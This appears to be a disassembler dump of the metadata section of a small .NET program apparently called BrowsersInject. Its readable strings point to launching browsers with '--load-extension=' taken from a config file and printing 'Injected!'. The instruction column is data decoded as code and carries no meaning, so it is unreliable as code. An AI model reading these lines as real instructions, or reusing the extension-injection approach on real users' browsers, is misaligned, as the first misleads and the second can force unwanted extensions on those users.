  4025ef:	69 63 65 73 00 44 65 	imul   $0x65440073,0x65(%ebx),%esp
  4025f6:	62 75 67             	bound  %esi,0x67(%ebp)
  4025f9:	67 69 6e 67 4d 6f 64 	imul   $0x65646f4d,0x67(%bp),%ebp
  402600:	65 
  402601:	73 00                	jae    0x402603
  402603:	61                   	popa
  402604:	72 67                	jb     0x40266d
  402606:	73 00                	jae    0x402608
  402608:	50                   	push   %eax
  402609:	72 6f                	jb     0x40267a
  40260b:	63 65 73             	arpl   %esp,0x73(%ebp)
  40260e:	73 00                	jae    0x402610
  402610:	73 65                	jae    0x402677
  402612:	74 5f                	je     0x402673
  402614:	41                   	inc    %ecx
  402615:	72 67                	jb     0x40267e
  402617:	75 6d                	jne    0x402686
  402619:	65 6e                	outsb  %gs:(%esi),(%dx)
  40261b:	74 73                	je     0x402690
  40261d:	00 43 6f             	add    %al,0x6f(%ebx)
  402620:	6e                   	outsb  %ds:(%esi),(%dx)
  402621:	63 61 74             	arpl   %esp,0x74(%ecx)
  402624:	00 4f 62             	add    %cl,0x62(%edi)
  402627:	6a 65                	push   $0x65
  402629:	63 74 00 42          	arpl   %esi,0x42(%eax,%eax,1)
  40262d:	72 6f                	jb     0x40269e
  40262f:	77 73                	ja     0x4026a4
  402631:	65 72 73             	gs jb  0x4026a7
  402634:	49                   	dec    %ecx
  402635:	6e                   	outsb  %ds:(%esi),(%dx)
  402636:	6a 65                	push   $0x65
  402638:	63 74 00 45          	arpl   %esi,0x45(%eax,%eax,1)
  40263c:	6e                   	outsb  %ds:(%esi),(%dx)
  40263d:	76 69                	jbe    0x4026a8
  40263f:	72 6f                	jb     0x4026b0
  402641:	6e                   	outsb  %ds:(%esi),(%dx)
  402642:	6d                   	insl   (%dx),%es:(%edi)
  402643:	65 6e                	outsb  %gs:(%esi),(%dx)
  402645:	74 00                	je     0x402647
  402647:	53                   	push   %ebx
  402648:	74 61                	je     0x4026ab
  40264a:	72 74                	jb     0x4026c0
  40264c:	00 52 65             	add    %dl,0x65(%edx)
  40264f:	61                   	popa
  402650:	64 41                	fs inc %ecx
  402652:	6c                   	insb   (%dx),%es:(%edi)
  402653:	6c                   	insb   (%dx),%es:(%edi)
  402654:	54                   	push   %esp
  402655:	65 78 74             	gs js  0x4026cc
  402658:	00 52 65             	add    %dl,0x65(%edx)
  40265b:	61                   	popa
  40265c:	64 4b                	fs dec %ebx
  40265e:	65 79 00             	gs jns 0x402661
  402661:	67 65 74 5f          	addr16 gs je 0x4026c4
  402665:	43                   	inc    %ebx
  402666:	75 72                	jne    0x4026da
  402668:	72 65                	jb     0x4026cf
  40266a:	6e                   	outsb  %ds:(%esi),(%dx)
  40266b:	74 44                	je     0x4026b1
  40266d:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  402674:	79 00                	jns    0x402676
  402676:	00 00                	add    %al,(%eax)
  402678:	00 17                	add    %dl,(%edi)
  40267a:	5c                   	pop    %esp
  40267b:	00 63 00             	add    %ah,0x0(%ebx)
  40267e:	6f                   	outsl  %ds:(%esi),(%dx)
  40267f:	00 6e 00             	add    %ch,0x0(%esi)
  402682:	66 00 69 00          	data16 add %ch,0x0(%ecx)
  402686:	67 00 2e 00 74       	add    %ch,0x7400
  40268b:	00 78 00             	add    %bh,0x0(%eax)
  40268e:	74 00                	je     0x402690
  402690:	00 1b                	add    %bl,(%ebx)
  402692:	5c                   	pop    %esp
  402693:	00 6c 00 61          	add    %ch,0x61(%eax,%eax,1)
  402697:	00 75 00             	add    %dh,0x0(%ebp)
  40269a:	6e                   	outsb  %ds:(%esi),(%dx)
  40269b:	00 63 00             	add    %ah,0x0(%ebx)
  40269e:	68 00 65 00 72       	push   $0x72006500
  4026a3:	00 2e                	add    %ch,(%esi)
  4026a5:	00 65 00             	add    %ah,0x0(%ebp)
  4026a8:	78 00                	js     0x4026aa
  4026aa:	65 00 00             	add    %al,%gs:(%eax)
  4026ad:	23 2d 00 2d 00 6c    	and    0x6c002d00,%ebp
  4026b3:	00 6f 00             	add    %ch,0x0(%edi)
  4026b6:	61                   	popa
  4026b7:	00 64 00 2d          	add    %ah,0x2d(%eax,%eax,1)
  4026bb:	00 65 00             	add    %ah,0x0(%ebp)
  4026be:	78 00                	js     0x4026c0
  4026c0:	74 00                	je     0x4026c2
  4026c2:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4026c6:	73 00                	jae    0x4026c8
  4026c8:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4026ce:	3d 00 01 13 49       	cmp    $0x49130100,%eax
  4026d3:	00 6e 00             	add    %ch,0x0(%esi)
  4026d6:	6a 00                	push   $0x0
  4026d8:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  4026dc:	74 00                	je     0x4026de
  4026de:	65 00 64 00 21       	add    %ah,%gs:0x21(%eax,%eax,1)
  4026e3:	00 00                	add    %al,(%eax)
  4026e5:	00 00                	add    %al,(%eax)
  4026e7:	00 a6 e7 4c 2b 55    	add    %ah,0x552b4ce7(%esi)
  4026ed:	7b 4a                	jnp    0x402739
  4026ef:	48                   	dec    %eax
  4026f0:	8d 4d 51             	lea    0x51(%ebp),%ecx
  4026f3:	76 e3                	jbe    0x4026d8
  4026f5:	b2 ff                	mov    $0xff,%dl
  4026f7:	b7 00                	mov    $0x0,%bh
  4026f9:	04 20                	add    $0x20,%al
  4026fb:	01 01                	add    %eax,(%ecx)
  4026fd:	08 03                	or     %al,(%ebx)
  4026ff:	20 00                	and    %al,(%eax)
  402701:	01 05 20 01 01 11    	add    %eax,0x11010120
  402707:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40270a:	01 01                	add    %eax,(%ecx)
  40270c:	0e                   	push   %cs
  40270d:	04 20                	add    $0x20,%al
  40270f:	01 01                	add    %eax,(%ecx)
  402711:	02 05 07 02 0e 12    	add    0x120e0207,%al
  402717:	45                   	inc    %ebp
  402718:	03 00                	add    (%eax),%eax
  40271a:	00 0e                	add    %cl,(%esi)
  40271c:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  402721:	0e                   	push   %cs
  402722:	04 00                	add    $0x0,%al
  402724:	01 0e                	add    %ecx,(%esi)
  402726:	0e                   	push   %cs
  402727:	06                   	push   %es
  402728:	00 01                	add    %al,(%ecx)
  40272a:	12 45 12             	adc    0x12(%ebp),%al
  40272d:	55                   	push   %ebp
  40272e:	04 00                	add    $0x0,%al
  402730:	01 01                	add    %eax,(%ecx)
  402732:	0e                   	push   %cs
  402733:	04 00                	add    $0x0,%al
  402735:	00 11                	add    %dl,(%ecx)
  402737:	61                   	popa
  402738:	08 b7 7a 5c 56 19    	or     %dh,0x19565c7a(%edi)
  40273e:	34 e0                	xor    $0xe0,%al
  402740:	89 05 00 01 01 1d    	mov    %eax,0x1d010100
  402746:	0e                   	push   %cs
  402747:	08 01                	or     %al,(%ecx)
  402749:	00 08                	add    %cl,(%eax)
  40274b:	00 00                	add    %al,(%eax)
  40274d:	00 00                	add    %al,(%eax)
  40274f:	00 1e                	add    %bl,(%esi)
  402751:	01 00                	add    %eax,(%eax)
  402753:	01 00                	add    %eax,(%eax)
  402755:	54                   	push   %esp
  402756:	02 16                	add    (%esi),%dl
  402758:	57                   	push   %edi
  402759:	72 61                	jb     0x4027bc
  40275b:	70 4e                	jo     0x4027ab
  40275d:	6f                   	outsl  %ds:(%esi),(%dx)
  40275e:	6e                   	outsb  %ds:(%esi),(%dx)
  40275f:	45                   	inc    %ebp
  402760:	78 63                	js     0x4027c5
  402762:	65 70 74             	gs jo  0x4027d9
  402765:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40276c:	77 73                	ja     0x4027e1
  40276e:	01 08                	add    %ecx,(%eax)
  402770:	01 00                	add    %eax,(%eax)
  402772:	07                   	pop    %es
  402773:	01 00                	add    %eax,(%eax)
  402775:	00 00                	add    %al,(%eax)
  402777:	00 13                	add    %dl,(%ebx)
  402779:	01 00                	add    %eax,(%eax)
  40277b:	0e                   	push   %cs
  40277c:	42                   	inc    %edx
  40277d:	72 6f                	jb     0x4027ee
  40277f:	77 73                	ja     0x4027f4
  402781:	65 72 73             	gs jb  0x4027f7
  402784:	49                   	dec    %ecx
  402785:	6e                   	outsb  %ds:(%esi),(%dx)
  402786:	6a 65                	push   $0x65
  402788:	63 74 00 00          	arpl   %esi,0x0(%eax,%eax,1)
  40278c:	05 01 00 00 00       	add    $0x1,%eax
  402791:	00 17                	add    %dl,(%edi)
  402793:	01 00                	add    %eax,(%eax)
  402795:	12 43 6f             	adc    0x6f(%ebx),%al
  402798:	70 79                	jo     0x402813
  40279a:	72 69                	jb     0x402805
  40279c:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  4027a2:	20 20                	and    %ah,(%eax)
  4027a4:	32 30                	xor    (%eax),%dh
  4027a6:	32 30                	xor    (%eax),%dh
  4027a8:	00 00                	add    %al,(%eax)
  4027aa:	29 01                	sub    %eax,(%ecx)
  4027ac:	00 24 66             	add    %ah,(%esi,%eiz,2)
  4027af:	63 39                	arpl   %edi,(%ecx)
  4027b1:	39 37                	cmp    %esi,(%edi)
  4027b3:	38 36                	cmp    %dh,(%esi)
  4027b5:	61                   	popa
  4027b6:	2d 62 36 63 63       	sub    $0x63633662,%eax
  4027bb:	2d 34 62 32 30       	sub    $0x30326234,%eax
  4027c0:	2d 39 64 39 30       	sub    $0x30396439,%eax
  4027c5:	2d 39 31 66 65       	sub    $0x65663139,%eax
  4027ca:	66 62 62 32          	bound  %sp,0x32(%edx)
  4027ce:	34 65                	xor    $0x65,%al
  4027d0:	39 39                	cmp    %edi,(%ecx)
  4027d2:	00 00                	add    %al,(%eax)
  4027d4:	0c 01                	or     $0x1,%al
  4027d6:	00 07                	add    %al,(%edi)
  4027d8:	31 2e                	xor    %ebp,(%esi)
  4027da:	30 2e                	xor    %ch,(%esi)
  4027dc:	30 2e                	xor    %ch,(%esi)
  4027de:	30 00                	xor    %al,(%eax)
  4027e0:	00 47 01             	add    %al,0x1(%edi)
  4027e3:	00 1a                	add    %bl,(%edx)
  4027e5:	2e 4e                	cs dec %esi
  4027e7:	45                   	inc    %ebp
  4027e8:	54                   	push   %esp
  4027e9:	46                   	inc    %esi
  4027ea:	72 61                	jb     0x40284d
  4027ec:	6d                   	insl   (%dx),%es:(%edi)
  4027ed:	65 77 6f             	gs ja  0x40285f
  4027f0:	72 6b                	jb     0x40285d
  4027f2:	2c 56                	sub    $0x56,%al
  4027f4:	65 72 73             	gs jb  0x40286a
  4027f7:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  4027fe:	30 01                	xor    %al,(%ecx)
  402800:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  402804:	46                   	inc    %esi
  402805:	72 61                	jb     0x402868
  402807:	6d                   	insl   (%dx),%es:(%edi)
  402808:	65 77 6f             	gs ja  0x40287a
  40280b:	72 6b                	jb     0x402878
  40280d:	44                   	inc    %esp
  40280e:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  402815:	61                   	popa
  402816:	6d                   	insl   (%dx),%es:(%edi)
  402817:	65 10 2e             	adc    %ch,%gs:(%esi)
  40281a:	4e                   	dec    %esi
  40281b:	45                   	inc    %ebp
  40281c:	54                   	push   %esp
  40281d:	20 46 72             	and    %al,0x72(%esi)
  402820:	61                   	popa
  402821:	6d                   	insl   (%dx),%es:(%edi)
  402822:	65 77 6f             	gs ja  0x402894
  402825:	72 6b                	jb     0x402892
  402827:	20 34 00             	and    %dh,(%eax,%eax,1)
  40282a:	00 00                	add    %al,(%eax)
  40282c:	00 00                	add    %al,(%eax)
  40282e:	00 00                	add    %al,(%eax)
  402830:	3b f2                	cmp    %edx,%esi
  402832:	eb d2                	jmp    0x402806
  402834:	00 00                	add    %al,(%eax)
  402836:	00 00                	add    %al,(%eax)
  402838:	02 00                	add    (%eax),%al
  40283a:	00 00                	add    %al,(%eax)
  40283c:	5f                   	pop    %edi
  40283d:	00 00                	add    %al,(%eax)
  40283f:	00 64 28 00          	add    %ah,0x0(%eax,%ebp,1)
  402843:	00 64 0a 00          	add    %ah,0x0(%edx,%ecx,1)
	...
  402853:	00 10                	add    %dl,(%eax)
	...
  402861:	00 00                	add    %al,(%eax)
  402863:	00 52 53             	add    %dl,0x53(%edx)
  402866:	44                   	inc    %esp
  402867:	53                   	push   %ebx
  402868:	0f 9a 1c 82          	setp   (%edx,%eax,4)
  40286c:	28 cc                	sub    %cl,%ah
  40286e:	b9 4a 91 a4 14       	mov    $0x14a4914a,%ecx
  402873:	bc 7d 7d 0d ea       	mov    $0xea0d7d7d,%esp
  402878:	01 00                	add    %eax,(%eax)
  40287a:	00 00                	add    %al,(%eax)
  40287c:	43                   	inc    %ebx
  40287d:	3a 5c 55 73          	cmp    0x73(%ebp,%edx,2),%bl
  402881:	65 72 73             	gs jb  0x4028f7
  402884:	5c                   	pop    %esp
  402885:	31 31                	xor    %esi,(%ecx)
  402887:	31 31                	xor    %esi,(%ecx)
  402889:	5c                   	pop    %esp
  40288a:	73 6f                	jae    0x4028fb
  40288c:	75 72                	jne    0x402900
  40288e:	63 65 5c             	arpl   %esp,0x5c(%ebp)
  402891:	72 65                	jb     0x4028f8
  402893:	70 6f                	jo     0x402904
  402895:	73 5c                	jae    0x4028f3
  402897:	42                   	inc    %edx
  402898:	72 6f                	jb     0x402909
  40289a:	77 73                	ja     0x40290f
  40289c:	65 72 73             	gs jb  0x402912
  40289f:	49                   	dec    %ecx
  4028a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4028a1:	6a 65                	push   $0x65
  4028a3:	63 74 5c 6f          	arpl   %esi,0x6f(%esp,%ebx,2)
  4028a7:	62 6a 5c             	bound  %ebp,0x5c(%edx)
  4028aa:	44                   	inc    %esp
  4028ab:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  4028af:	5c                   	pop    %esp
  4028b0:	42                   	inc    %edx
  4028b1:	72 6f                	jb     0x402922
  4028b3:	77 73                	ja     0x402928
  4028b5:	65 72 73             	gs jb  0x40292b
  4028b8:	49                   	dec    %ecx
  4028b9:	6e                   	outsb  %ds:(%esi),(%dx)
  4028ba:	6a 65                	push   $0x65
  4028bc:	63 74 2e 70          	arpl   %esi,0x70(%esi,%ebp,1)
  4028c0:	64 62 00             	bound  %eax,%fs:(%eax)
  4028c3:	eb 28                	jmp    0x4028ed
	...
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	05 29 00 00 00       	add    $0x29,%eax
  4028d4:	20 00                	and    %al,(%eax)
	...
  4028ea:	00 f7                	add    %dh,%bh
  4028ec:	28 00                	sub    %al,(%eax)
	...
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	00 5f 43             	add    %bl,0x43(%edi)
  4028fb:	6f                   	outsl  %ds:(%esi),(%dx)
  4028fc:	72 45                	jb     0x402943
  4028fe:	78 65                	js     0x402965
  402900:	4d                   	dec    %ebp
  402901:	61                   	popa
  402902:	69 6e 00 6d 73 63 6f 	imul   $0x6f63736d,0x0(%esi),%ebp
  402909:	72 65                	jb     0x402970
  40290b:	65 2e 64 6c          	gs cs fs insb (%dx),%es:(%edi)
  40290f:	6c                   	insb   (%dx),%es:(%edi)
  402910:	00 00                	add    %al,(%eax)
  402912:	00 00                	add    %al,(%eax)
  402914:	00 00                	add    %al,(%eax)
  402916:	ff 25 00 20 40 00    	jmp    *0x402000
